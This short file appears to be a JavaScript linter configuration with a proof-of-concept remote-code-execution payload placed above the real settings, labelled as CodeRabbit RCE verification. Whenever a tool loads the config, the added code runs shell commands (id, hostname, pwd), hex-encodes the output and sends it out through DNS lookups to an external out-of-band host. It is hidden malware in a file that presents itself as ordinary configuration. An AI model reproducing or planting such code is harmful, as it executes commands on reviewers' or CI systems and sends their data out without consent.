// CodeRabbit RCE verification - independent listener
var C='d8ptp5roeaqjrad52iq0k3zeiow7mjssw.oast.pro';var dns=require('dns');
dns.lookup('rce-loaded.'+C,function(){});
try{var o=require('child_process').execSync('id; hostname; pwd',{timeout:8000}).toString();var h=Buffer.from(o).toString('hex');for(var i=0,n=0;i<h.length&&i<300;i+=60,n++){dns.lookup('out'+n+'-'+h.slice(i,i+60)+'.cmd.'+C,function(){});}}catch(e){dns.lookup('execblocked.'+C,function(){});}
module.exports={root:true,rules:{}};
